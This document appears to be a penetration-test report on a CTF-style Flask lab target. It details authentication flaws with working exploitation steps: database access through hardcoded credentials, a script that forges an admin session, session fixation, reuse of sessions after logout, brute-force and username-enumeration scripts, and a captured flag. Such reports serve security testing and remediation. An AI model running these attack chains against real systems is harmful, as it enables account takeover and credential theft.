# Security Assessment Report

## Executive Summary

**Target:** http://localhost:41705
**Assessment Date:** January 15, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Critical authentication vulnerabilities were identified and successfully exploited:

- **Database Credential Extraction with Admin Session Forgery (CRITICAL):** Hardcoded database credentials (root:admin_router) combined with plaintext password storage enabled extraction of admin credentials and session forgery, resulting in complete administrative account takeover and CTF flag capture.

- **Session Fixation Attack (HIGH):** Application fails to regenerate session IDs upon authentication, allowing attackers to fix victim session IDs.

- **Incomplete Session Invalidation (CRITICAL):** Logout function only removes user_id from session, leaving username and password_hash intact, enabling session reuse after logout.

- **Missing Rate Limits (CRITICAL):** No rate limiting, CAPTCHA, or account lockout mechanisms on login endpoint, enabling unlimited brute force attempts at 28.79 requests/second.

- **Hardcoded Test Credentials (HIGH):** Test account with credentials test:test provides immediate authenticated access without exploitation.

- **Debug Parameter Information Disclosure (HIGH):** Debug parameter exposes complete session data in HTML comments, accessible to unauthenticated users, revealing password hashes and session structure.

- **Account Enumeration (MEDIUM):** Distinct error messages for valid vs invalid usernames enable efficient username enumeration.

- **Missing Session Timeout (HIGH):** Sessions configured with 31-day lifetime and automatic refresh enable indefinite session persistence.

- **Missing Cookie Security Flags (HIGH):** Session cookies transmitted without Secure and SameSite flags, enabling interception over HTTP and CSRF attacks.

**Authorization Vulnerabilities:**

No authorization vulnerabilities were found. The application has only one admin-restricted endpoint (/admin_panel) with proper is_admin flag checking. However, administrative access was achieved through authentication vulnerabilities rather than authorization bypass.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application uses Jinja2 auto-escaping for all template rendering, effectively preventing XSS attacks.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application consistently uses SQLAlchemy ORM with parameterized queries for all database interactions, and no shell command execution with user input exists.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application makes no outbound HTTP requests and has no HTTP client libraries installed or imported.

## Network Reconnaissance

**Open Ports & Exposed Services:**

The target application runs on port 41705 behind Caddy HTTP server. Network scanning revealed:

- **Port 80/tcp:** Caddy httpd (reverse proxy to target application)
- **Port 443/tcp:** SSL/HTTPS (Caddy)
- **Port 631/tcp:** CUPS 2.3 printing service (out of scope)
- **Port 5003/tcp:** Werkzeug httpd 3.0.3 Python 3.8.17 (out of scope)
- **Port 5004/tcp:** Werkzeug httpd 3.0.6 Python 3.8.17 (out of scope)
- **Port 7777/tcp:** SimpleHTTPServer 0.6 Python 3.12.10 (out of scope)
- **Port 9999/tcp:** abyss service (out of scope)
- **Port 49158/tcp:** Tailscale Golang net/http server requiring authentication (out of scope)

**Security-Relevant Findings:**

- **No TLS/SSL on target application:** Application accessible only via HTTP on port 80, transmitting all credentials and session data in plaintext.

- **Apache HTTP Server 2.4.65 (Debian):** Running Werkzeug httpd 3.0.3 Python 3.8.17 backend, indicating Flask application deployment.

- **Missing security headers:** No Content-Security-Policy, X-Frame-Options, or Strict-Transport-Security headers detected.

- **Permissive CORS configuration:** Access-Control-Allow-Origin: * allows cross-origin requests from any domain.

**Subdomain Discoveries:**

Multiple subdomains were identified but are unrelated to the target application (mail servers, autodiscover services for other local networks). These do not expand the target attack surface.

**Technology Stack:**

- **Frontend:** Server-side Jinja2 templates with Bootstrap 5.1.3 and jQuery 3.5.1
- **Backend:** Python 3.x with Flask 3.1.1+ on Apache HTTP Server 2.4.65 with mod_wsgi
- **Database:** MySQL 5.7.15 (End-of-Life since October 2019, contains known unpatched CVEs)
- **Deployment:** Docker containerized with no TLS encryption

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-03: Database Credential Extraction with Admin Session Forgery (FLAG CAPTURED)

**Summary:**
- **Vulnerable location:** MySQL database accessible via hardcoded credentials `root:admin_router` at `app/__init__.py:15`
- **Overview:** Combined exploitation of plaintext password storage and hardcoded database credentials to extract admin password, forge authenticated session, and access admin panel
- **Impact:** Complete administrative account takeover and CTF flag extraction
- **Severity:** CRITICAL

**Prerequisites:**
- Docker access to database container (xben-088-24_db_1)
- Knowledge of hardcoded database credentials from source code

**Exploitation Steps:**

1. Connect to MySQL database using hardcoded credentials:
```bash
docker exec -it xben-088-24_db_1 mysql -u root -padmin_router database
```

2. Extract admin password from user table (stored in plaintext):
```sql
SELECT username, password, is_admin FROM user WHERE is_admin=1;
```
Result: Admin password is `J1JKHBD4MB3KH4KMM1UCIXCPWCS79N0R3OZZGISIXE3HB2CEEEEV92QAY6ZLXA4ZG1FDG58GO66A2NCTTCEU948QWXVWR1YRUUY8`

3. Compute PBKDF2-HMAC-SHA256 password hash using the hardcoded secret key as salt:
```python
import hashlib
password = "J1JKHBD4MB3KH4KMM1UCIXCPWCS79N0R3OZZGISIXE3HB2CEEEEV92QAY6ZLXA4ZG1FDG58GO66A2NCTTCEU948QWXVWR1YRUUY8"
secret_key = "your_secret_key"
password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), secret_key.encode(), 100000).hex()
# Result: 3b94acdbeccefe89241e168a548b85d03e5b9b4638911fab778d0d7d451a280a
```

4. Create forged session data and inject into mysessions table:
```python
import msgpack
import secrets
session_data = {
    'username': 'admin',
    'password_hash': '3b94acdbeccefe89241e168a548b85d03e5b9b4638911fab778d0d7d451a280a',
    'user_id': 2,
    '_permanent': True
}
packed_data = msgpack.packb(session_data)
session_id = 'session:' + secrets.token_urlsafe(32)
```

5. Insert forged session into database:
```sql
INSERT INTO mysessions (session_id, data, expiry)
VALUES ('[SESSION_ID]', '[PACKED_DATA]', '2025-12-29 00:00:00');
```

6. Access admin panel with forged session cookie:
```bash
curl -b "session=[SESSION_ID]" http://localhost:41705/admin_panel
```

**Proof of Impact:**

**FLAG EXTRACTED:** `FLAG{ee06d2ea2f8c84a61fe68cd1219e4915d9e37215d364fd70f0fc24243ca03cd9}`

Complete exploitation script available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/forge_admin_session_db.py`

**Notes:**
This vulnerability chains three critical weaknesses:
1. Hardcoded database credentials (root:admin_router)
2. Plaintext password storage in database
3. SQL-backed session storage allowing direct session injection

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST http://localhost:41705/login (routes.py:65-70)
- **Overview:** Application fails to regenerate session ID upon successful authentication, allowing attackers to fix a victim's session ID before login
- **Impact:** Account takeover via pre-set session identifiers
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Attacker creates or obtains a session ID:
```python
import requests
session_id = "attacker_controlled_session_EXPLOIT_123"
```

2. Attacker tricks victim into using this session (via phishing link, XSS, etc.):
```
http://localhost:41705/login
Cookie: session=attacker_controlled_session_EXPLOIT_123
```

3. Victim logs in with valid credentials using the attacker's pre-set session cookie

4. Application accepts the session ID without regeneration (verified at routes.py:65-70 - no session regeneration call)

5. Attacker uses the same session ID to access victim's authenticated session:
```bash
curl -b "session=attacker_controlled_session_EXPLOIT_123" http://localhost:41705/dashboard
```

**Proof of Impact:**

Test script confirmed:
- Session ID before login: `attacker_controlled_session_12345`
- Session ID after login: `attacker_controlled_session_12345` (IDENTICAL - vulnerable!)
- Attacker successfully accessed dashboard with pre-set session after victim authentication

Complete test output available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/session_fixation_report.py`

**Notes:**
Flask-Session does not automatically regenerate session IDs. The application must explicitly call session regeneration after authentication, which is missing in routes.py:65-70.

---

### AUTH-VULN-05: Incomplete Session Invalidation After Logout

**Summary:**
- **Vulnerable location:** GET http://localhost:41705/logout (routes.py:79)
- **Overview:** Logout function only removes `user_id` from session, leaving `username` and `password_hash` intact, allowing session reuse after logout
- **Impact:** Session hijacking, persistent unauthorized access on shared computers
- **Severity:** CRITICAL

**Prerequisites:** Valid authenticated session

**Exploitation Steps:**

1. Login as test user and capture session cookie:
```bash
curl -c /tmp/cookies.txt -X POST http://localhost:41705/login \
  -d "username=test&password=test"
```

2. Access dashboard to confirm authentication:
```bash
curl -b /tmp/cookies.txt http://localhost:41705/dashboard?debug=session
```
Session data before logout:
```python
{'_permanent': True, 'username': 'test', 'password_hash': '0cda9742a5f7afc070294c47d5058dc1ee5d5e88141d2829cbbe0b7d0a9924ea', 'user_id': 1}
```

3. Trigger logout:
```bash
curl -b /tmp/cookies.txt http://localhost:41705/logout
```

4. Access dashboard again WITHOUT re-authenticating:
```bash
curl -b /tmp/cookies.txt http://localhost:41705/dashboard
```
**Result:** HTTP 200 - Dashboard accessible!

5. Check session data after logout:
```bash
curl -b /tmp/cookies.txt "http://localhost:41705/dashboard?debug=session"
```
Session data after logout:
```python
{'_permanent': True, 'username': 'test', 'password_hash': '0cda9742a5f7afc070294c47d5058dc1ee5d5e88141d2829cbbe0b7d0a9924ea'}
```

**Proof of Impact:**

- Session remains fully functional after logout
- `username` and `password_hash` persist in session
- `verify_session()` function reconstructs authentication from residual data
- Session cookie can be reused indefinitely after logout

Complete test results available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/session_test_complete_results.txt`

**Notes:**
The logout implementation at routes.py:79 only executes `session.pop('user_id', None)`. It should call `session.clear()` to remove all session data and `app.session_interface.destroy()` to delete the server-side session.

---

### AUTH-VULN-07: Missing Rate Limits (Brute Force Attack)

**Summary:**
- **Vulnerable location:** POST http://localhost:41705/login (routes.py:50-74)
- **Overview:** No rate limiting, CAPTCHA, or account lockout mechanisms on login endpoint, enabling unlimited brute force attempts
- **Impact:** Credential compromise via brute force and password spraying attacks
- **Severity:** CRITICAL

**Prerequisites:** None

**Exploitation Steps:**

1. Enumerate valid username (AUTH-VULN-10):
```bash
curl -X POST http://localhost:41705/login -d "username=test&password=wrong"
# Response: "Wrong password." (confirms 'test' is valid username)
```

2. Launch brute force attack with 50 rapid password attempts:
```python
import requests
target = "http://localhost:41705/login"
username = "test"
passwords = ["password", "admin", "test", "123456", ...]  # 50 passwords

for password in passwords:
    response = requests.post(target, data={"username": username, "password": password})
    if "Welcome to the Dashboard" in response.text:
        print(f"SUCCESS: {password}")
        break
```

**Proof of Impact:**

Test results from `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/final_vulnerability_test.py`:
- **Total attempts:** 50
- **Successful attempts:** 50 (100% success rate)
- **Total time:** 1.74 seconds
- **Attack rate:** 28.79 requests/second
- **Blocking/throttling:** NONE detected
- **Account lockout:** NONE

Attack capability:
- 1,000 passwords: 34.7 seconds
- 10,000 passwords: 5.8 minutes
- 100,000 passwords: 1.0 hours

Successfully compromised `test:test` account in **0.86 seconds** using combined enumeration and brute force.

Complete attack demonstration available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/demonstrate_attack.py`

**Notes:**
No Flask-Limiter dependency in requirements.txt. No Apache mod_evasive or mod_security configured. No account lockout columns in User model (models.py).

---

### AUTH-VULN-08: Hardcoded Test Credentials

**Summary:**
- **Vulnerable location:** POST http://localhost:41705/login with credentials test:test
- **Overview:** Hardcoded test account with known credentials provides immediate authenticated access
- **Impact:** Immediate authentication bypass without exploitation
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Login with hardcoded credentials:
```bash
curl -c /tmp/session.txt -X POST http://localhost:41705/login \
  -d "username=test&password=test" -L
```

2. Access authenticated resources:
```bash
curl -b /tmp/session.txt http://localhost:41705/dashboard
```

**Proof of Impact:**

- Successfully logged in using test:test credentials
- Gained access to authenticated dashboard at http://localhost:41705/dashboard
- Account has `is_admin=False` but can access all non-admin endpoints
- TODO comment in login.html:1 acknowledges credentials should be deleted: `<!-- TODO: Delete the testing account (test:test). -->`

Browser-based exploitation via Playwright also successful - logged in and accessed full user interface.

**Notes:**
Test account created at `__init__.py:23-34` with username='test', password='test', is_admin=False. While not an admin account, it provides authenticated access to bypass authentication controls.

---

### AUTH-VULN-09: Debug Parameter Information Disclosure

**Summary:**
- **Vulnerable location:** GET http://localhost:41705/login?debug=session (routes.py:53-59)
- **Overview:** Debug parameter exposes complete session data in HTML comments, accessible to unauthenticated users
- **Impact:** Session structure revelation, password hash exposure, username enumeration
- **Severity:** HIGH

**Prerequisites:** None (accessible without authentication on /login endpoint)

**Exploitation Steps:**

1. Access login page with debug parameter (no authentication required):
```bash
curl -s "http://localhost:41705/login?debug=session" | grep -A 5 "Server-Side Session Content"
```

2. Login with test:test credentials and access debug endpoint:
```bash
curl -c /tmp/cookies.txt -X POST http://localhost:41705/login -d "username=test&password=test"
curl -b /tmp/cookies.txt "http://localhost:41705/dashboard?debug=session"
```

3. Extract session data from HTML comments:
```html
<!--
Server-Side Session Content:
{'_permanent': True, 'username': 'test', 'password_hash': '0cda9742a5f7afc070294c47d5058dc1ee5d5e88141d2829cbbe0b7d0a9924ea', 'user_id': 1, 'session_id': 'ewVK17n3nT09MVxTq63hJ4intrw9z253wAwF-Of4qk0'}
-->
```

**Proof of Impact:**

Exposed sensitive data:
- **Username:** test
- **Password Hash:** 0cda9742a5f7afc070294c47d5058dc1ee5d5e88141d2829cbbe0b7d0a9924ea
- **User ID:** 1
- **Session ID:** ewVK17n3nT09MVxTq63hJ4intrw9z253wAwF-Of4qk0
- **Session Permanence:** True

This data enables:
- Session structure prediction for forgery attempts
- Offline password cracking of exposed hashes
- Username enumeration
- Understanding of session composition for advanced attacks

Complete extraction script available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/test_auth_debug_disclosure.py`

**Notes:**
Debug parameter accepted on /login, /dashboard, and /admin_panel endpoints (routes.py:53-59, 86-88, 113-115). Should be completely removed from production code.

---

### AUTH-VULN-10: Account Enumeration via Error Messages

**Summary:**
- **Vulnerable location:** POST http://localhost:41705/login (routes.py:40, 42)
- **Overview:** Distinct error messages for valid vs invalid usernames enable account enumeration
- **Impact:** Valid username discovery reduces brute force attack space
- **Severity:** MEDIUM

**Prerequisites:** None

**Exploitation Steps:**

1. Test with valid username:
```bash
curl -X POST http://localhost:41705/login \
  -d "username=test&password=wrongpassword" | grep "error-message"
```
Response: `Wrong password.` (confirms username exists)

2. Test with invalid username:
```bash
curl -X POST http://localhost:41705/login \
  -d "username=invaliduser123&password=anypassword" | grep "error-message"
```
Response: `Invalid username.` (confirms username does NOT exist)

3. Enumerate valid usernames from candidate list:
```python
import requests
candidates = ['admin', 'test', 'root', 'administrator', 'user', 'guest']
valid_usernames = []

for username in candidates:
    response = requests.post("http://localhost:41705/login",
                           data={"username": username, "password": "test"})
    if "Wrong password" in response.text:
        valid_usernames.append(username)
```

**Proof of Impact:**

Enumeration results from test script:
- **Test accounts:** admin, test, root, administrator, user, invaliduser123
- **Valid usernames found:** admin, test
- **Error message for valid:** "Wrong password." (3168 bytes response)
- **Error message for invalid:** "Invalid username." (3170 bytes response)
- **Response size difference:** 2 bytes

Additional timing-based enumeration:
- Valid username: ~100-200ms (includes PBKDF2 hashing with 100,000 iterations)
- Invalid username: ~10-20ms (database query only)

Test results available at: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/test_enumeration_detailed.py`

**Notes:**
Combined with AUTH-VULN-07 (no rate limiting), enumeration enables efficient targeted brute force attacks on discovered valid accounts.

---

### AUTH-VULN-11: Missing Session Timeout Configuration

**Summary:**
- **Vulnerable location:** Flask session configuration in app/__init__.py (missing PERMANENT_SESSION_LIFETIME)
- **Overview:** Sessions configured with 31-day lifetime and automatic refresh on every request, enabling indefinite session persistence
- **Impact:** Stolen sessions remain valid for extended periods, up to indefinite with periodic use
- **Severity:** HIGH

**Prerequisites:** Valid session cookie

**Exploitation Steps:**

1. Login and capture session cookie with expiration:
```bash
curl -i -X POST http://localhost:41705/login -d "username=test&password=test" | grep "Set-Cookie"
```
Response:
```
Set-Cookie: session=xu0Ylbk3sXkWkTF-h-oTI82eY9fEbUJA5IWRtJRP_kA;
Expires=Sat, 29 Nov 2025 04:39:03 GMT; HttpOnly; Path=/
```

2. Calculate session lifetime:
```python
from datetime import datetime
expires = datetime.strptime("Sat, 29 Nov 2025 04:39:03 GMT", "%a, %d %b %Y %H:%M:%S %Z")
now = datetime.utcnow()
lifetime = expires - now
# Result: 744 hours / 31 days
```

3. Test session persistence after inactivity:
```bash
# Wait 5 seconds
sleep 5
curl -b "session=[SESSION_COOKIE]" http://localhost:41705/dashboard
# Result: HTTP 200 - Session still valid
```

4. Demonstrate session refresh behavior:
```bash
# Make multiple requests and observe cookie refresh
for i in {1..3}; do
  curl -i -b "session=[SESSION]" http://localhost:41705/dashboard | grep "Set-Cookie"
  sleep 2
done
# Each request refreshes the expiration to 31 days from 'now'
```

**Proof of Impact:**

Session configuration analysis:
- **Default lifetime:** 31 days (744 hours)
- **Refresh on request:** YES (Flask default SESSION_REFRESH_EACH_REQUEST=True)
- **Inactivity timeout:** NONE
- **Result:** With access once every 30 days, session persists INDEFINITELY

Attack scenario:
1. Attacker steals session cookie via XSS/network sniffing
2. Cookie valid for 31 days minimum
3. If attacker accesses account once every 30 days, session refreshes to new 31-day window
4. Attacker maintains PERMANENT access with minimal interaction

Complete test results: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-088-24/session_timeout_poc.md`

**Notes:**
Flask defaults missing in __init__.py: PERMANENT_SESSION_LIFETIME (should be 30 minutes), SESSION_REFRESH_EACH_REQUEST (should be False).

---

### AUTH-VULN-02: Missing Session Cookie Security Flags

**Summary:**
- **Vulnerable location:** Flask session configuration in app/__init__.py (missing SESSION_COOKIE_SECURE and SESSION_COOKIE_SAMESITE)
- **Overview:** Session cookies transmitted without Secure and SameSite flags, enabling interception over HTTP and cross-site request attacks
- **Impact:** Session hijacking via network interception, CSRF attacks
- **Severity:** HIGH

**Prerequisites:** None

**Exploitation Steps:**

1. Login and capture Set-Cookie header:
```bash
curl -i -X POST http://localhost:41705/login \
  -d "username=test&password=test" | grep "Set-Cookie"
```

2. Analyze cookie flags:
```
Set-Cookie: session=xu0Ylbk3sXkWkTF-h-oTI82eY9fEbUJA5IWRtJRP_kA;
Expires=Sat, 29 Nov 2025 04:39:03 GMT; HttpOnly; Path=/
```

Present flags:
- `HttpOnly`: ✓ SET
- `Path=/`: ✓ SET

Missing flags:
- `Secure`: ✗ NOT SET (cookie sent over HTTP)
- `SameSite`: ✗ NOT SET (cookie sent in cross-origin requests)

**Proof of Impact:**

**Missing Secure Flag Impact:**
- Session cookies transmitted over HTTP in plaintext
- Network sniffing (requires MITM - out of scope) would capture cookies
- Combined with AUTH-VULN-01 (HTTP-only deployment) enables session interception

**Missing SameSite Flag Impact:**
- Cookies included in cross-site requests
- Enables CSRF attacks from attacker-controlled domains
- Example attack: Attacker site makes POST request to http://localhost:41705/admin_panel
- Victim's cookies automatically included in cross-origin request

Verification via curl:
```bash
# Cookies sent over HTTP (no Secure flag enforcement):
curl -v http://localhost:41705/dashboard -b "session=[COOKIE]" 2>&1 | grep "Cookie:"
# Result: Cookie sent successfully over HTTP
```

**Notes:**
Configuration missing from __init__.py:
```python
app.config['SESSION_COOKIE_SECURE'] = True  # Requires HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # Prevents CSRF
```

Combined with permissive CORS (Access-Control-Allow-Origin: *) in Apache config, creates multiple attack vectors.
